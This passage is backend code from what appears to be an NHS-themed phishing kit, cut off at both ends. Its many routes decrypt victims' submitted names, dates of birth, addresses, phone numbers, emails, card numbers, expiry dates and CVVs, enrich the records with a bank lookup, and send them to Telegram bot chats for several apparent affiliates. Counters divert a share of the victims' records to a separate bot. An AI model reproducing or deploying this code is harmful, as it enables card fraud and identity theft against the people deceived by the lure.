      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSpooferGoofer:\n${originalText}`
      );
      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=NHS:\n${originalText}`
      );

      res.send("Update Completed");
    });
});

app.options("/nhsMason", cors());

app.post("/nhsMason", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=NHS:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/@kworthy12", cors());

app.post("/@kworthy12", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS4:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1955185965&text=NHS4:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/Tarrifi", cors());

app.post("/Tarrifi", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSTarrifi:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/littlewaynesjobs", cors());

app.post("/littlewaynesjobs", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSWayne:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1532191460&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendKelvFriendRes", cors());

app.post("/sendKelvFriendRes", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5231391571&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

let fpaysC = 3;

app.options("/sendFpays2", cors());

app.post("/sendFpays2", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSFPays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NHS:\n${originalText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

let masterboy = 0;

app.options("/M4STERB0Y", cors());

app.post("/M4STERB0Y", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (masterboy == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        masterboy = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMasterboy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=NHS:\n${originalText}`
        );
        masterboy += 1;
      }

      res.send("Update Completed");
    });
});

let skiii719 = 0;

app.options("/skiii719", cors());

app.post("/skiii719", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

let Tcapz688 = 0;

app.options("/Tcapz688", cors());

app.post("/Tcapz688", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSFZ:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1612469030&text=NHS:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/actualTcapz688", cors());

app.post("/actualTcapz688", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=NHS:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

let mannyman789 = 0;

app.options("/mannyman789", cors());

app.post("/mannyman789", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mannyman789 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mannyman789 = 0;
      } else {
        axios.post(
